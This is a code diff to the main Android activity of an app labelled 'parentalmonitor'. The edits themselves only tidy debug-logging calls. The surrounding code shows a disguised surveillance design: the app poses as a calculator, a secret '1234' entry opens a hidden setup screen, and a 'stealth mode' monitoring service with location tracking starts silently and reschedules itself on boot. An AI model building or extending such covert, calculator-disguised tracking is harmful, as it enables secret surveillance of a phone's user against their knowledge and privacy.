@@ -33,7 +33,6 @@ class MainActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "MainActivity onCreate")
-        if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "DEBUG mode")
 
         preferencesManager = PreferencesManager.getInstance(this)
 
@@ -170,7 +169,7 @@ class MainActivity : AppCompatActivity() {
     
     private fun calculate() {
         if (!justCalculated && currentNumber == "1234" && previousNumber.isEmpty() && operator.isEmpty()) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
+            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "SECRET CODE -> open SetupActivity")
             currentNumber = ""
             previousNumber = ""
             operator = ""
@@ -256,7 +255,7 @@ class MainActivity : AppCompatActivity() {
         try {
             startActivity(Intent(this, SetupActivity::class.java))
         } catch (e: Exception) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to open setup", e)
+            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to open setup", e)
             try {
                 Toast.makeText(this, getString(R.string.msg_open_setup_failed, e.message ?: ""), Toast.LENGTH_SHORT).show()
             } catch (_: Exception) {
@@ -270,9 +269,9 @@ class MainActivity : AppCompatActivity() {
                 preferencesManager = PreferencesManager.getInstance(applicationContext)
             } catch (_: Exception) {
             }
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
+            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Starting monitoring in background (stealth mode)")
             if (!preferencesManager.isConfigured()) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
+            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Not configured - cannot start monitoring")
             try {
                 MessageScheduler.scheduleBootRestart(this)
             } catch (_: Exception) {
@@ -281,7 +280,7 @@ class MainActivity : AppCompatActivity() {
         }
         
         if (!hasAllPermissions()) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
+            if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Permissions missing - staying silent, grant via Setup")
             try {
                 MessageScheduler.scheduleBootRestart(this)
             } catch (_: Exception) {
@@ -291,25 +290,25 @@ class MainActivity : AppCompatActivity() {
         
         // Start monitoring service silently
         if (preferencesManager.userDisabledMonitoring || !preferencesManager.userConsentedMonitoring) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
+            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring disabled by user - not auto-starting")
             return
         }
         if (!hasBackgroundLocation()) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Background location missing - starting anyway with degraded location, grant via Setup")
+            if (BuildConfig.DEBUG) android.util.Log.w("MainActivity", "Background location missing - starting anyway with degraded location, grant via Setup")
         }
         if (!preferencesManager.isMonitoringEnabled || !MonitoringService.isRunning) {
             try {
                 startMonitoringService()
-                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
+                if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "✓ Monitoring started in background!")
             } catch (e: Exception) {
-                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
+                if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "✗ Failed to start monitoring: ${e.message}")
                 try {
                     MessageScheduler.scheduleBootRestart(this)
                 } catch (_: Exception) {
                 }
             }
         } else {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
+            if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Monitoring already running")
         }
         } catch (_: Exception) {
         }
@@ -327,22 +326,22 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun startMonitoringService() {
-        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Creating service intent...")
+        if (BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Creating service intent...")
         val intent = Intent(this, MonitoringService::class.java).apply {
             action = MonitoringService.ACTION_START_MONITORING
         }
 
-        if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Starting service...")
+        if (BuildConfig.DEBUG) android.util.Log.d("MainActivity", "Starting service...")
         try {
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(intent)
-                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as foreground service")
+                if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as foreground service")
             } else {
                 startService(intent)
-                if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as regular service")
+                if (BuildConfig.DEBUG) android.util.Log.i("MainActivity", "Started as regular service")
             }
         } catch (e: Exception) {
-            if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to start service", e)
+            if (BuildConfig.DEBUG) android.util.Log.e("MainActivity", "Failed to start service", e)
             throw e
         }
     }
